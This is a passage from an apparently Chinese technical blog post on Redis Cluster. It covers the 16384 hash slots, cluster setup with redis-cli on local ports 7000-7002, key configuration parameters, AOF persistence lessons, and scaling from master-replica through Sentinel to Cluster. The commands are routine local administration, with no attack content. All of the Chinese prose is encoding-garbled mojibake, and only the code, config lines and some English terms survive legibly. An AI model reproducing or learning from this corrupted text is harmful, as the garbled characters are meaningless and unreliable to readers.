<p>Redis Clusteræ˜¯Rediså®˜æ–¹æä¾›çš„åˆ†å¸ƒå¼å®ç°ï¼Œé¦–æ¬¡äº®ç›¸äºRedis 3.0ç‰ˆæœ¬ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡<strong>æ•°æ®åˆ†ç‰‡ï¼ˆShardingï¼‰<strong>å°†æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹ä¸Šï¼Œä»è€Œçªç ´å•æœºå†…å­˜å’Œæ€§èƒ½çš„é™åˆ¶ã€‚Redis Clusterå°†æ•´ä¸ªæ•°æ®ç©ºé—´åˆ’åˆ†ä¸º</strong>16384ä¸ªæ§½ï¼ˆslotï¼‰</strong>ï¼Œæ¯ä¸ªæ§½è´Ÿè´£å­˜å‚¨ä¸€éƒ¨åˆ†é”®å€¼å¯¹ã€‚æ¯ä¸ªèŠ‚ç‚¹åˆ™è¢«åˆ†é…è‹¥å¹²æ§½ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å®ç°æ•°æ®çš„åˆ†å¸ƒå¼å­˜å‚¨ã€‚</p>
<p>å½¢è±¡åœ°è¯´ï¼ŒRedis Clusterå°±åƒä¸€ä¸ªå·¨å¤§çš„å›¾ä¹¦é¦†ï¼Œ16384ä¸ªæ§½æ˜¯ä¹¦æ¶ä¸Šçš„æ ¼å­ï¼Œè€Œæ¯ä¸ªèŠ‚ç‚¹åˆ™æ˜¯è´Ÿè´£ç®¡ç†ä¸€éƒ¨åˆ†æ ¼å­çš„ç®¡ç†å‘˜ã€‚å®¢æˆ·ç«¯é€šè¿‡é”®çš„å“ˆå¸Œå€¼æ‰¾åˆ°å¯¹åº”çš„æ§½ï¼Œå†å®šä½åˆ°å…·ä½“çš„èŠ‚ç‚¹å®Œæˆæ“ä½œã€‚è¿™ç§è®¾è®¡æ—¢ç®€å•åˆé«˜æ•ˆï¼Œé¿å…äº†ä¼ ç»Ÿä»£ç†æ¶æ„çš„å¤æ‚æ€§ã€‚</p>
<h3 data-id="heading-10">æ ¸å¿ƒä¼˜åŠ¿</h3>
<p>Redis Clusterçš„é­…åŠ›åœ¨äºå®ƒå¸¦æ¥çš„ä¸‰å¤§ä¼˜åŠ¿ï¼š</p>
<ol>
<li>
<p><strong>æ°´å¹³æ‰©å±•</strong><br/>
å•æœºRedisçš„å®¹é‡å’Œæ€§èƒ½å—é™äºç¡¬ä»¶ï¼Œè€ŒRedis Clusteré€šè¿‡æ·»åŠ èŠ‚ç‚¹å°±èƒ½è½»æ¾æ‰©å±•ã€‚æ— è®ºæ˜¯æ•°æ®é‡ç¿»å€è¿˜æ˜¯å¹¶å‘è¯·æ±‚æ¿€å¢ï¼Œåªéœ€åŠ å…¥æ–°èŠ‚ç‚¹å¹¶é‡æ–°åˆ†é…æ§½ï¼Œå°±èƒ½è®©ç³»ç»Ÿâ€œé•¿å¤§â€ã€‚è¿™å°±åƒç»™è½¦é˜Ÿå¢åŠ è½¦è¾†ï¼Œè¿åŠ›è‡ªç„¶æå‡ã€‚</p>
</li>
<li>
<p><strong>é«˜å¯ç”¨æ€§</strong><br/>
Redis Clusteræ”¯æŒ<strong>ä¸»ä»å¤åˆ¶</strong>å’Œ<strong>æ•…éšœè½¬ç§»</strong>ã€‚æ¯ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥é…ç½®ä¸€ä¸ªæˆ–å¤šä¸ªä»èŠ‚ç‚¹ï¼Œå½“ä¸»èŠ‚ç‚¹å®•æœºæ—¶ï¼Œä»èŠ‚ç‚¹ä¼šè‡ªåŠ¨æ¥ç®¡ã€‚è¿™ç§æœºåˆ¶ç¡®ä¿äº†å³ä½¿éƒ¨åˆ†èŠ‚ç‚¹å¤±æ•ˆï¼ŒæœåŠ¡ä¾ç„¶å¯ç”¨ã€‚</p>
</li>
<li>
<p><strong>å»ä¸­å¿ƒåŒ–è®¾è®¡</strong><br/>
ä¸ä¸€äº›éœ€è¦ä»£ç†ï¼ˆProxyï¼‰åˆ†å‘çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸åŒï¼ŒRedis Clusteré‡‡ç”¨æ— ä»£ç†æ¶æ„ï¼Œå®¢æˆ·ç«¯ç›´æ¥ä¸èŠ‚ç‚¹é€šä¿¡ã€‚è¿™ç§è®¾è®¡å‡å°‘äº†ä¸­é—´å±‚å¼€é”€ï¼Œæå‡äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿé™ä½äº†ç»´æŠ¤å¤æ‚åº¦ã€‚</p>
</li>
</ol>
<h3 data-id="heading-11">ä¸å•æœºæ¨¡å¼çš„å¯¹æ¯”</h3>
<p>ä¸ºäº†æ›´ç›´è§‚åœ°ç†è§£Redis Clusterçš„ä»·å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹è¡¨å¯¹æ¯”å•æœºæ¨¡å¼å’Œé›†ç¾¤æ¨¡å¼ï¼š</p>






























<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>å•æœºRedis</strong></th><th><strong>Redis Cluster</strong></th></tr></thead><tbody><tr><td>æ•°æ®å­˜å‚¨</td><td>é›†ä¸­åœ¨ä¸€å°æœºå™¨</td><td>åˆ†ç‰‡åˆ†å¸ƒå¤šä¸ªèŠ‚ç‚¹</td></tr><tr><td>å®¹é‡æ‰©å±•</td><td>å—é™äºå•æœºå†…å­˜</td><td>å¯é€šè¿‡åŠ èŠ‚ç‚¹æ— é™æ‰©å±•</td></tr><tr><td>å¯ç”¨æ€§</td><td>å•ç‚¹æ•…éšœå³ä¸å¯ç”¨</td><td>ä¸»ä»åˆ‡æ¢ä¿éšœé«˜å¯ç”¨</td></tr><tr><td>ç®¡ç†æ–¹å¼</td><td>ç®€å•é›†ä¸­å¼</td><td>åˆ†å¸ƒå¼ååŒï¼Œç¨å¤æ‚</td></tr></tbody></table>
<p>å•æœºæ¨¡å¼åƒç‹¬å¥ä¹æ‰‹ï¼Œç®€å•é«˜æ•ˆä½†èƒ½åŠ›æœ‰é™ï¼›é›†ç¾¤æ¨¡å¼åˆ™åƒäº¤å“ä¹å›¢ï¼Œåä½œå¸¦æ¥æ›´å¤§çš„èˆå°ã€‚</p>
<h3 data-id="heading-12">ç‰¹è‰²åŠŸèƒ½è§£æ</h3>
<p>Redis Clusterä¸ä»…æä¾›äº†åŸºç¡€çš„åˆ†ç‰‡èƒ½åŠ›ï¼Œè¿˜æœ‰ä¸€äº›ç‰¹è‰²åŠŸèƒ½å€¼å¾—å…³æ³¨ï¼š</p>
<ul>
<li>
<p><strong>åŠ¨æ€æ‰©ç¼©å®¹</strong><br/>
ä½ å¯ä»¥åœ¨é›†ç¾¤è¿è¡Œæ—¶æ·»åŠ æˆ–åˆ é™¤èŠ‚ç‚¹ï¼Œæ§½ä¼šè‡ªåŠ¨è¿ç§»åˆ°æ–°èŠ‚ç‚¹æˆ–ä»æ—§èŠ‚ç‚¹ç§»é™¤ã€‚è¿™ç§åœ¨çº¿æ“ä½œè®©æ‰©å®¹å˜å¾—â€œä¸æ»‘â€ï¼Œæ— éœ€åœæœºã€‚</p>
</li>
<li>
<p><strong>ä¸€è‡´æ€§å“ˆå¸Œä¸æ§½è¿ç§»</strong><br/>
Redis Clusterä½¿ç”¨å“ˆå¸Œæ§½è€Œéä¼ ç»Ÿä¸€è‡´æ€§å“ˆå¸Œã€‚é”®é€šè¿‡<code>CRC16(key) % 16384</code>è®¡ç®—æ§½ä½ç½®ï¼ŒèŠ‚ç‚¹å˜æ›´æ—¶åªéœ€è¿ç§»æ§½è€Œéå…¨éƒ¨æ•°æ®ã€‚è¿™ç§è®¾è®¡åœ¨æ‰©ç¼©å®¹æ—¶æå¤§å‡å°‘äº†æ•°æ®æ¬è¿æˆæœ¬ã€‚</p>
</li>
</ul>
<h3 data-id="heading-13">è¸©å‘ç»éªŒï¼šæ§½åˆ†é…ä¸å‡çš„æ•™è®­</h3>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæˆ‘æ›¾é‡åˆ°è¿‡æ§½åˆ†é…ä¸å‡å¯¼è‡´çš„çƒ­ç‚¹é—®é¢˜ã€‚å½“æ—¶åœ¨ä¸€ä¸ªå®æ—¶æ’è¡Œæ¦œç³»ç»Ÿä¸­ï¼Œåˆå§‹é›†ç¾¤åªæœ‰3ä¸ªèŠ‚ç‚¹ï¼Œæ§½åˆ†é…é»˜è®¤å¹³å‡ï¼Œä½†æŸäº›é«˜é¢‘è®¿é—®çš„é”®é›†ä¸­è½åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¯¼è‡´è¯¥èŠ‚ç‚¹è´Ÿè½½è¿‡é«˜ï¼Œå»¶è¿Ÿé£™å‡ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šé€šè¿‡<code>redis-cli --cluster check</code>æ£€æŸ¥æ§½åˆ†å¸ƒï¼Œå‘ç°é—®é¢˜åæ‰‹åŠ¨æ‰§è¡Œ<code>CLUSTER ADDSLOTS</code>é‡æ–°åˆ†é…æ§½ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¼•å…¥äº†ç›‘æ§å·¥å…·ï¼ˆå¦‚Prometheus+Grafanaï¼‰ï¼Œå®æ—¶è·Ÿè¸ªæ¯ä¸ªèŠ‚ç‚¹çš„QPSå’Œå†…å­˜ä½¿ç”¨ç‡ï¼Œé¿å…ç±»ä¼¼é—®é¢˜å†æ¬¡å‘ç”Ÿã€‚<br/>
<strong>ç»éªŒæ•™è®­</strong>ï¼šé›†ç¾¤åˆå§‹åŒ–æ—¶ï¼Œåˆç†è§„åˆ’æ§½åˆ†é…å¹¶ç»“åˆä¸šåŠ¡ç‰¹ç‚¹é¢„ç•™å†—ä½™ï¼Œèƒ½æœ‰æ•ˆé¿å…çƒ­ç‚¹é—®é¢˜ã€‚</p>
<hr/>
<h3 data-id="heading-14">ç¤ºæ„å›¾ï¼šRedis Clusteræ•°æ®åˆ†ç‰‡æœºåˆ¶</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[å®¢æˆ·ç«¯]</span> --&gt; <span class="hljs-selector-attr">[Key: <span class="hljs-string">"user:123"</span>]</span> --&gt; <span class="hljs-selector-attr">[CRC16(<span class="hljs-string">"user:123"</span>) % 16384 = Slot 4567]</span>
   |                                    |
   v                                    v
<span class="hljs-selector-attr">[Node A: Slot 0-5460]</span>         <span class="hljs-selector-attr">[Node B: Slot 5461-10922]</span> --&gt; å¤„ç†è¯·æ±‚
<span class="hljs-selector-attr">[Node C: Slot 10923-16383]</span>
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼šå®¢æˆ·ç«¯æ ¹æ®é”®è®¡ç®—æ§½å·ï¼Œå®šä½åˆ°å¯¹åº”èŠ‚ç‚¹å®Œæˆæ“ä½œã€‚</p>
<hr/>
<h3 data-id="heading-15">è¿‡æ¸¡æ®µ</h3>
<p>é€šè¿‡å¯¹Redis Clusteræ ¸å¿ƒæ¦‚å¿µçš„å‰–æï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œå®ƒä»¥åˆ†ç‰‡å’Œé«˜å¯ç”¨ä¸ºåŸºç¡€ï¼Œä¸ºåˆ†å¸ƒå¼æ‰©å±•é“ºå¹³äº†é“è·¯ã€‚ä½†å…‰æœ‰ç†è®ºè¿˜ä¸å¤Ÿï¼Œå¦‚ä½•åœ¨å®è·µä¸­æ­å»ºå¹¶é©¾é©­è¿™ä¸ªâ€œåˆ†å¸ƒå¼è½¦é˜Ÿâ€å‘¢ï¼Ÿä¸‹ä¸€èŠ‚ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨Redisé›†ç¾¤çš„æ­å»ºä¸é…ç½®ï¼Œç»“åˆå®é™…ä»£ç å’Œç»éªŒï¼Œå¸¦ä½ ä»é›¶å¼€å§‹æ„å»ºä¸€ä¸ªå¥å£®çš„é›†ç¾¤ç¯å¢ƒã€‚</p>
<hr/>
<h2 data-id="heading-16">4. Redisé›†ç¾¤çš„æ­å»ºä¸é…ç½®</h2>
<p>äº†è§£äº†Redis Clusterçš„æ ¸å¿ƒæ¦‚å¿µå’Œä¼˜åŠ¿åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦æŠŠç†è®ºè½¬åŒ–ä¸ºå®è·µï¼Œäº²æ‰‹æ­å»ºä¸€ä¸ªå±äºè‡ªå·±çš„é›†ç¾¤ã€‚Redisé›†ç¾¤çš„æ­å»ºå¹¶ä¸å¤æ‚ï¼Œä½†ç»†èŠ‚å†³å®šæˆè´¥ã€‚ä»ç¯å¢ƒå‡†å¤‡åˆ°é…ç½®ä¼˜åŒ–ï¼Œæ¯ä¸€æ­¥éƒ½éœ€è¦ç”¨å¿ƒã€‚æœ¬èŠ‚å°†å¸¦ä½ ä¸€æ­¥æ­¥å®Œæˆé›†ç¾¤æ­å»ºï¼Œå¹¶åˆ†äº«æˆ‘åœ¨å®é™…é¡¹ç›®ä¸­çš„ç»éªŒæ•™è®­ï¼Œè®©ä½ å°‘èµ°å¼¯è·¯ã€‚</p>
<h3 data-id="heading-17">ç¯å¢ƒå‡†å¤‡</h3>
<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œå…ˆåšå¥½åŠŸè¯¾ã€‚Redis Clusterå¯¹ç‰ˆæœ¬æœ‰è¦æ±‚ï¼Œå»ºè®®ä½¿ç”¨<strong>Redis 5.0æˆ–ä»¥ä¸Š</strong>ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬åœ¨é›†ç¾¤ç®¡ç†å’Œç¨³å®šæ€§ä¸Šæœ‰äº†æ˜¾è‘—æ”¹è¿›ã€‚ç¡¬ä»¶æ–¹é¢ï¼Œè‡³å°‘éœ€è¦3å°æœåŠ¡å™¨ï¼ˆæˆ–è™šæ‹Ÿæœºï¼‰æ¥æ¨¡æ‹Ÿå¤šèŠ‚ç‚¹ç¯å¢ƒï¼Œæ¯å°å»ºè®®é…ç½®è‡³å°‘2GBå†…å­˜å’ŒåŒæ ¸CPUã€‚å¦‚æœæ˜¯æµ‹è¯•ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥åœ¨å•æœºä¸Šé€šè¿‡ä¸åŒç«¯å£æ¨¡æ‹Ÿå¤šä¸ªå®ä¾‹ã€‚</p>
<p>ä»¥æˆ‘çš„ç»éªŒä¸ºä¾‹ï¼Œåœ¨ä¸€ä¸ªä¸­å‹é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä¸ºé›†ç¾¤è§„åˆ’äº†6ä¸ªèŠ‚ç‚¹ï¼ˆ3ä¸»3ä»ï¼‰ï¼Œæ¯å°æœåŠ¡å™¨16GBå†…å­˜ï¼Œç¡®ä¿åˆæœŸæ•°æ®é‡å’ŒQPSéœ€æ±‚éƒ½èƒ½è½»æ¾åº”å¯¹ã€‚è¿™ç§è§„åˆ’ä¸ºåç»­æ‰©å®¹ç•™å‡ºäº†ç©ºé—´ã€‚</p>
<h3 data-id="heading-18">æ‰‹åŠ¨æ­å»ºé›†ç¾¤æ­¥éª¤</h3>
<p>å‡è®¾æˆ‘ä»¬ç”¨å•æœºå¤šç«¯å£çš„æ–¹å¼æ­å»ºä¸€ä¸ªå°å‹é›†ç¾¤ï¼ŒåŒ…å«3ä¸ªä¸»èŠ‚ç‚¹ï¼ˆç«¯å£7000-7002ï¼‰ã€‚ä»¥ä¸‹æ˜¯å…·ä½“æ­¥éª¤ï¼š</p>
<ol>
<li>
<p><strong>å¯åŠ¨å¤šä¸ªRediså®ä¾‹</strong><br/>
ä¸ºæ¯ä¸ªèŠ‚ç‚¹åˆ›å»ºç‹¬ç«‹çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚<code>redis-7000.conf</code>ï¼‰ï¼Œå¹¶å¯åŠ¨å®ä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-server redis-7000.conf
redis-server redis-7001.conf
redis-server redis-7002.conf
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨redis-cliåˆ›å»ºé›†ç¾¤</strong><br/>
Redisæä¾›äº†ä¸€ä¸ªä¾¿æ·çš„å·¥å…·<code>redis-cli --cluster</code>ï¼Œå¯ä»¥å¿«é€Ÿæ„å»ºé›†ç¾¤ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli --cluster create 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 --cluster-replicas 0
</code></pre>
<ul>
<li><strong>æ³¨é‡Šè¯´æ˜</strong>ï¼š
<ul>
<li><code>--cluster-replicas 0</code>ï¼šè¡¨ç¤ºæš‚ä¸é…ç½®ä»èŠ‚ç‚¹ï¼Œä»…æ­å»º3ä¸ªä¸»èŠ‚ç‚¹ã€‚</li>
<li>å‘½ä»¤æ‰§è¡Œåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ†é…16384ä¸ªæ§½ï¼Œå¹¶æç¤ºç¡®è®¤åˆ†é…æ–¹æ¡ˆï¼Œè¾“å…¥<code>yes</code>å³å¯å®Œæˆã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>éªŒè¯é›†ç¾¤çŠ¶æ€</strong><br/>
æ£€æŸ¥é›†ç¾¤æ˜¯å¦æ­£å¸¸è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli -p 7000 cluster info
</code></pre>
<p>è¾“å‡ºä¸­<code>cluster_state:ok</code>è¡¨ç¤ºé›†ç¾¤å·²å°±ç»ªã€‚</p>
</li>
</ol>
<h3 data-id="heading-19">é…ç½®æ–‡ä»¶è¯¦è§£</h3>
<p>Redis Clusterä¾èµ–å‡ ä¸ªå…³é”®é…ç½®å‚æ•°ï¼Œä»¥ä¸‹æ˜¯<code>redis-7000.conf</code>çš„ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-conf" lang="conf">port 7000                # èŠ‚ç‚¹ç›‘å¬ç«¯å£
cluster-enabled yes      # å¯ç”¨é›†ç¾¤æ¨¡å¼
cluster-config-file nodes-7000.conf  # é›†ç¾¤æ‹“æ‰‘é…ç½®æ–‡ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆ
cluster-node-timeout 15000  # èŠ‚ç‚¹é—´é€šä¿¡è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
</code></pre>
<ul>
<li><strong><code>cluster-enabled</code></strong>ï¼šå¿…é¡»è®¾ä¸º<code>yes</code>ï¼Œå¦åˆ™èŠ‚ç‚¹ä»¥å•æœºæ¨¡å¼è¿è¡Œã€‚</li>
<li><strong><code>cluster-config-file</code></strong>ï¼šè®°å½•é›†ç¾¤çŠ¶æ€çš„æ–‡ä»¶ï¼Œæ¯æ¬¡èŠ‚ç‚¹å˜æ›´æ—¶è‡ªåŠ¨æ›´æ–°ã€‚</li>
<li><strong><code>cluster-node-timeout</code></strong>ï¼šè®¾ç½®è¿‡çŸ­å¯èƒ½å¯¼è‡´é¢‘ç¹è¯¯åˆ¤èŠ‚ç‚¹æ•…éšœï¼Œè¿‡é•¿åˆ™å½±å“æ•…éšœè½¬ç§»é€Ÿåº¦ï¼Œé»˜è®¤15000msæ˜¯ä¸ªæŠ˜ä¸­é€‰æ‹©ã€‚</li>
</ul>
<h3 data-id="heading-20">æœ€ä½³å®è·µ</h3>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œé›†ç¾¤æ­å»ºçš„æˆåŠŸä¸ä»…å–å†³äºæŠ€æœ¯å®ç°ï¼Œè¿˜éœ€è¦ä¸€äº›è§„åˆ’å’Œä¼˜åŒ–ï¼š</p>
<ul>
<li>
<p><strong>åˆå§‹èŠ‚ç‚¹æ•°è§„åˆ’</strong><br/>
æˆ‘æ›¾åœ¨ä¸€ä¸ªç¤¾äº¤å¹³å°é¡¹ç›®ä¸­åªéƒ¨ç½²äº†3ä¸ªèŠ‚ç‚¹ï¼Œç»“æœä¸åˆ°åŠå¹´å°±å› æ•°æ®é‡å¢é•¿éœ€è¦æ‰©å®¹ã€‚é¢‘ç¹æ‰©å®¹ä¸ä»…éº»çƒ¦ï¼Œè¿˜å¯èƒ½å¼•å‘æ§½è¿ç§»æ—¶çš„æ€§èƒ½æŠ–åŠ¨ã€‚<strong>å»ºè®®</strong>ï¼šæ ¹æ®ä¸šåŠ¡è§„æ¨¡é¢„ä¼°æœªæ¥6-12ä¸ªæœˆçš„éœ€æ±‚ï¼Œåˆå§‹éƒ¨ç½²è‡³å°‘6ä¸ªèŠ‚ç‚¹ï¼ˆ3ä¸»3ä»ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å·¥å…·è¾…åŠ©ç®¡ç†</strong><br/>
é™¤äº†<code>redis-cli</code>ï¼Œæ¨èä½¿ç”¨RedisInsightè¿™ç±»å¯è§†åŒ–å·¥å…·ï¼Œå¯ä»¥ç›´è§‚æŸ¥çœ‹æ§½åˆ†å¸ƒå’ŒèŠ‚ç‚¹çŠ¶æ€ï¼Œæå‡è¿ç»´æ•ˆç‡ã€‚</p>
</li>
</ul>
<h3 data-id="heading-21">è¸©å‘ç»éªŒï¼šæœªå¼€å¯AOFçš„æ•™è®­</h3>
<p>æœ‰ä¸€æ¬¡åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘å¿½ç•¥äº†AOFï¼ˆAppend Only Fileï¼‰çš„é…ç½®ï¼Œé»˜è®¤åªå¯ç”¨äº†RDBå¿«ç…§ã€‚ç»“æœä¸€å°ä¸»èŠ‚ç‚¹æ„å¤–å®•æœºé‡å¯åï¼Œä¸¢å¤±äº†æœ€è¿‘å‡ åˆ†é’Ÿçš„æ•°æ®ï¼Œå¯¼è‡´ç”¨æˆ·è®¢å•çŠ¶æ€å¼‚å¸¸ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šåœ¨é›†ç¾¤é…ç½®æ–‡ä»¶ä¸­å¯ç”¨AOFï¼ˆ<code>appendonly yes</code>ï¼‰ï¼Œå¹¶å®šæœŸæ£€æŸ¥<code>appendfsync everysec</code>çš„åŒæ­¥ç­–ç•¥ï¼Œç¡®ä¿æ•°æ®æŒä¹…åŒ–ã€‚<br/>
<strong>ç»éªŒæ•™è®­</strong>ï¼šé›†ç¾¤çš„é«˜å¯ç”¨æ€§ä¸ç­‰äºæ•°æ®å®‰å…¨æ€§ï¼ŒRDBå’ŒAOFè¦åˆç†æ­é…ä½¿ç”¨ã€‚</p>
<hr/>
<h3 data-id="heading-22">ç¤ºä¾‹ä»£ç ï¼šæ£€æŸ¥é›†ç¾¤çŠ¶æ€</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥é›†ç¾¤åŸºæœ¬ä¿¡æ¯</span>
redis-cli -p 7000 cluster info
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"># cluster_state:ok</span>
<span class="hljs-comment"># cluster_slots_assigned:16384</span>
<span class="hljs-comment"># cluster_known_nodes:3</span>

<span class="hljs-comment"># æŸ¥çœ‹æ§½åˆ†é…è¯¦æƒ…</span>
redis-cli -p 7000 cluster slots
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"># 1) 1) (integer) 0</span>
<span class="hljs-comment">#    2) (integer) 5460</span>
<span class="hljs-comment">#    3) 1) "127.0.0.1"</span>
<span class="hljs-comment">#       2) (integer) 7000</span>
</code></pre>
<p><strong>æ³¨é‡Š</strong>ï¼š<code>cluster info</code>æ˜¾ç¤ºé›†ç¾¤æ•´ä½“çŠ¶æ€ï¼Œ<code>cluster slots</code>åˆ—å‡ºæ¯ä¸ªèŠ‚ç‚¹çš„æ§½èŒƒå›´ã€‚</p>
<hr/>
<h3 data-id="heading-23">ç¤ºæ„å›¾ï¼šRedisé›†ç¾¤æ­å»ºæ¶æ„</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[Node 7000: Slot 0-5460]</span>    <span class="hljs-selector-attr">[Node 7001: Slot 5461-10922]</span>    <span class="hljs-selector-attr">[Node 7002: Slot 10923-16383]</span>
         |                           |                             |
         +---------------------------+-----------------------------+
         |                 redis-cli <span class="hljs-attr">--cluster</span> create              |
         +---------------------------------------------------------+
                     <span class="hljs-selector-attr">[å®¢æˆ·ç«¯ç›´æ¥è®¿é—®ä»»æ„èŠ‚ç‚¹]</span>
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼š3ä¸ªèŠ‚ç‚¹é€šè¿‡<code>redis-cli</code>è¿æ¥ä¸ºé›†ç¾¤ï¼Œæ§½è‡ªåŠ¨åˆ†é…ã€‚</p>
<hr/>
<h3 data-id="heading-24">è¿‡æ¸¡æ®µ</h3>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä¸€ä¸ªåŸºæœ¬çš„Redisé›†ç¾¤å·²ç»æ­å»ºå®Œæˆã€‚ä½†ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ—…ç¨‹è¿œæœªç»“æŸï¼Œé›†ç¾¤åªæ˜¯èµ·ç‚¹ï¼Œå¦‚ä½•å¹³æ»‘æ‰©å±•å¹¶åº”å¯¹å¤æ‚åœºæ™¯æ‰æ˜¯çœŸæ­£çš„æŒ‘æˆ˜ã€‚ä¸‹ä¸€èŠ‚ï¼Œæˆ‘ä»¬å°†æ¢è®¨ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„å®Œæ•´æ‰©å±•è·¯å¾„ï¼Œç»“åˆçœŸå®æ¡ˆä¾‹å¸¦ä½ ä½“éªŒé›†ç¾¤åœ¨é¡¹ç›®ä¸­çš„å®æˆ˜åº”ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-25">5. ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ‰©å±•å®è·µ</h2>
<p>æ­å»ºå¥½Redisé›†ç¾¤åªæ˜¯ä¸‡é‡Œé•¿å¾çš„ç¬¬ä¸€æ­¥ï¼Œå¦‚ä½•ä»å•æœºæ¨¡å¼å¹³æ»‘è¿‡æ¸¡åˆ°åˆ†å¸ƒå¼æ¶æ„ï¼Œå¹¶åœ¨å®é™…é¡¹ç›®ä¸­å‘æŒ¥å…¶ä»·å€¼ï¼Œæ‰æ˜¯å¼€å‘è€…éœ€è¦é¢å¯¹çš„çœŸæ­£è€ƒéªŒã€‚è¿™ä¸€èŠ‚ï¼Œæˆ‘å°†å¸¦ä½ èµ°ä¸€éä»å•æœºåˆ°åˆ†å¸ƒå¼çš„å®Œæ•´æ‰©å±•è·¯å¾„ï¼Œå¹¶ç»“åˆä¸¤ä¸ªçœŸå®é¡¹ç›®æ¡ˆä¾‹ï¼Œåˆ†äº«è¿ç§»æ­¥éª¤ã€ä¼˜åŒ–æ–¹æ¡ˆå’Œè¸©å‘ç»éªŒã€‚å¸Œæœ›è¿™äº›å®æˆ˜å†…å®¹èƒ½ä¸ºä½ æä¾›çµæ„Ÿã€‚</p>
<h3 data-id="heading-26">æ‰©å±•è·¯å¾„</h3>
<p>Redisçš„æ‰©å±•å¹¶éä¸€è¹´è€Œå°±ï¼Œè€Œæ˜¯åˆ†é˜¶æ®µæ¼”è¿›ï¼Œæ¯ä¸€æ­¥éƒ½é’ˆå¯¹ç‰¹å®šéœ€æ±‚ï¼š</p>
<ol>
<li>
<p><strong>å•æœºåˆ°ä¸»ä»</strong><br/>
å•æœºRedisæ€§èƒ½æœ‰é™æ—¶ï¼Œç¬¬ä¸€æ­¥é€šå¸¸æ˜¯é…ç½®ä¸»ä»å¤åˆ¶ã€‚ä¸»èŠ‚ç‚¹è´Ÿè´£å†™æ“ä½œï¼Œä»èŠ‚ç‚¹åˆ†æ‹…è¯»è¯·æ±‚ï¼Œæå‡è¯»æ€§èƒ½ã€‚é…ç½®ç®€å•ï¼Œåªéœ€åœ¨ä»èŠ‚ç‚¹é…ç½®æ–‡ä»¶ä¸­æ·»åŠ <code>replicaof &lt;master-ip&gt; &lt;master-port&gt;</code>ã€‚</p>
</li>
<li>
<p><strong>ä¸»ä»åˆ°å“¨å…µï¼ˆSentinelï¼‰</strong><br/>
ä¸»ä»æ¨¡å¼è§£å†³äº†è¯»å‹åŠ›ï¼Œä½†ä¸»èŠ‚ç‚¹å®•æœºä»ä¼šå¯¼è‡´æœåŠ¡ä¸­æ–­ã€‚å“¨å…µæ¨¡å¼é€šè¿‡å¤šä¸ªSentinelè¿›ç¨‹ç›‘æ§èŠ‚ç‚¹çŠ¶æ€ï¼Œå®ç°è‡ªåŠ¨æ•…éšœè½¬ç§»ã€‚é…ç½®å“¨å…µåªéœ€æŒ‡å®šä¸»èŠ‚ç‚¹ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-conf" lang="conf">sentinel monitor mymaster 127.0.0.1 6379 2
</code></pre>
</li>
<li>
<p><strong>å“¨å…µåˆ°é›†ç¾¤</strong><br/>
å½“æ•°æ®é‡å’Œå¹¶å‘é‡è¿›ä¸€æ­¥å¢é•¿ï¼Œå“¨å…µæ¨¡å¼ä»å—é™äºå•ä¸»èŠ‚ç‚¹çš„å®¹é‡ã€‚è¿™æ—¶ï¼ŒRedis Clusterç™»åœºï¼Œé€šè¿‡åˆ†ç‰‡è§£å†³å®¹é‡ç“¶é¢ˆï¼ŒåŒæ—¶ä¿ç•™é«˜å¯ç”¨æ€§ã€‚</p>
</li>
</ol>
<p><strong>è·¯å¾„ç¤ºæ„å›¾</strong>ï¼š</p>
